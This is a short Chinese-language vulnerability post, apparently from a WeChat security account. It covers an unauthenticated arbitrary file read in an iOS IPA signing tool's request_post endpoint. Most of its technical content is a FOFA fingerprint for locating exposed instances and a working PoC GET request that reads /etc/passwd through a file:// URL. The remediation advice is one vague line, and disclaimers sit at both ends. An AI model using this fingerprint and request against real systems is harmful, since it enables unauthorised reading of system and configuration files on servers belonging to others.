#  苹果IOS端IPA签名工具任意文件读取漏洞   
 深白网安   2024-09-26 11:57  
  
# 免责声明：文章中内容来源于互联网，涉及的所有内容仅供安全研究与教学之用，读者将其信息做其他用途而造成的任何直接或者间接的后果及损失由用户承担全部法律及连带责任。文章作者不承担任何法律及连带责任！如有侵权烦请告知，我们会立即删除整改并向您致以歉意。  
  
# 0x00.漏洞介绍  
  
苹果IOS端IPA签名工具 request_post 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uY5HnRPFudic223A32yzG7TcGIGd8JtfLuegDuNtMEbgdyhicSOpCVMPvAHeWGD3O1wkUMibe2kiaictTtPr1LyIGlg/640?wx_fmt=png&from=appmsg "")  
# 0x01.漏洞复现  
  
fofa  
```
body="/assets/index/css/mobileSelect.css"
```  
  
poc  
```
GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1
Host: xxx.xxx.xxx.xxx
Connection: close
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uY5HnRPFudic223A32yzG7TcGIGd8JtfL4tKhBSKjh3QghYOehBTAAZbnggkQnAUtrRH91fOOSKNRLA611ofX0Q/640?wx_fmt=png&from=appmsg "")  
  
# 0x03.修复建议  
  
厂商已提供漏洞修补方案，请关注厂商主页及时更新  
  
# 免责声明：文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
  
**遵守网络安全法，请勿用于非法入侵，仅供学习**  
  
